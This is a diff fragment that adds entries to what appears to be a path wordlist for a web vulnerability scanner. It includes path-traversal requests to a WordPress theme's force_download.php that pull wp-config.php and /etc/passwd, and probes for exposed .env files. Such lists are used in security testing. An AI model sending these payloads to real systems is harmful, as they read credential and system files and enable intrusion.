@@ -40,3 +40,8 @@
 /{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
 /wp-json/wp/v2/pages?per_page=100
 /helpdesk/WebObjects/Helpdesk.woa
+/wp-content/themes/the-wound/style.css
+/wp-content/themes/the-wound/force_download.php?file=../../../wp-config.php
+/wp-content/themes/the-wound/force_download.php?file=/etc/passwd
+/.env
+/.env?raw??
